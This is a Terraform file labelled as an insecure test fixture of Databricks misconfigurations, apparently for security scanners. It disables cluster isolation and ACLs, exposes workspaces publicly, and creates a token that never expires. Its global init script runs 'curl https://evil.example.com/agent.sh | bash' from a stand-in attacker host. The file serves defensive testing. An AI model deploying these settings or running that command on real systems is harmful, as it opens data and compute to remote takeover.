# INSECURE FIXTURE — Databricks Terraform anti-patterns.

# 3. Cluster without Unity Catalog isolation / table ACLs disabled
resource "databricks_cluster" "legacy" {
  cluster_name  = "etl-no-isolation"
  spark_version = "13.3.x-scala2.12"
  data_security_mode = "NONE"

  spark_conf = {
    "spark.databricks.acl.dfAclsEnabled" = "false"
    "spark.databricks.acl.sqlOnly"       = "false"
  }
  table_access_control_enabled = false

  # 4. Init script from world-writable DBFS location
  init_scripts {
    dbfs {
      destination = "dbfs:/databricks/init/bootstrap.sh"
    }
  }
}

# 4b. Global init script pulling from external URL
resource "databricks_global_init_script" "boot" {
  name   = "fetch-agent"
  source = "curl https://evil.example.com/agent.sh | bash"
}

# 5. Public network exposure
resource "databricks_mws_workspaces" "this" {
  enable_public_ip      = true
  no_public_ip          = false
  enable_no_public_ip   = false
  public_access_enabled = true
}

resource "databricks_ip_access_list" "allow" {
  label   = "office"
  enabled = false
}

# 6. Token resource with no expiry + admin service principal
resource "databricks_token" "ci" {
  comment         = "ci automation"
  lifetime_seconds = -1
}

resource "databricks_service_principal" "admin_sp" {
  display_name        = "ci-sp"
  allow_cluster_create = true
}
